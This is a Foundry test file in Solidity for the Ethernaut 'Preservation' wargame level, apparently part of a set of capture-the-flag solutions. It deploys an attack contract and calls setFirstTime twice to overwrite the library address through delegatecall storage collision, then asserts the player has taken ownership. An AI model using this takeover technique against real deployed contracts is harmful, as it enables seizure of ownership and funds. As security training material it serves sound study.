// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/levels/Preservation/Preservation.sol";
import "../src/levels/Preservation/PreservationFactory.sol";
import "../src/attack/PreservationAttack.sol";

contract PreservationTest is Test {
    PreservationFactory public factory;
    Preservation public instance;
    PreservationAttack public attack;
    address public player = address(0x100);

    function setUp() public {
        factory = new PreservationFactory();
        instance = Preservation(factory.createInstance(player));
        attack = new PreservationAttack();
    }

    function testPreservationAttack() public {
        instance.setFirstTime(uint256(uint160(address(attack))));
        assertEq(instance.timeZone1Library(), address(attack));

        instance.setFirstTime(uint256(uint160(player)));
        assertTrue(factory.validateInstance((payable(address(instance))), player));
    }
}
